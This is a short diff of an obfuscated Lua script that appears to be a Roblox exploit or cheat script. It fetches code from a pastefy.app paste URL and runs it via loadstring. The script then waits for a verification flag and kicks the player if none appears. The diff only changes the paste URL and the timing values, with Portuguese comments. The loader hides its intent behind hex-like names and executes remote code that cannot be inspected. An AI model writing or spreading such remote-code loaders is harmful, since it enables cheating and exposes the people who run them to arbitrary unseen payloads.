@@ -4,7 +4,7 @@
 local _0x1A=getgenv local _0x2B=game local _0x3C=loadstring local _0x4D=pcall
 if not _0x1A()._0xVALID then
 	_0x4D(function()
-		local _0x5E="https://pastefy.app/qEhaExHd/raw"
+		local _0x5E="https://pastefy.app/T4ucHBtw/raw"
 		local _0x6F=_0x2B:HttpGet(_0x5E,true)
 		if _0x6F and #_0x6F>100 then
 			_0x3C(_0x6F)()
@@ -94,14 +94,14 @@ if _content and _content ~= "" then
 	end
 end
 
-local maxWaitTime = 1.5 -- Reduzido de 3 para 1.5 segundos
+local maxWaitTime = 10 -- ⏱️ 10 segundos para dar tempo da verificação completar
 local startTime = tick()
 while not getgenv()._0xVALID do
 	if tick() - startTime > maxWaitTime then
 		game.Players.LocalPlayer:Kick("Verification timeout!\n\nYou were not approved to use this script.")
 		return
 	end
-	task.wait(0.01) -- Reduzido de 0.05 para 0.01
+	task.wait(0.1) -- Aguarda 100ms entre cada verificação
 end
 
 task.spawn(function()
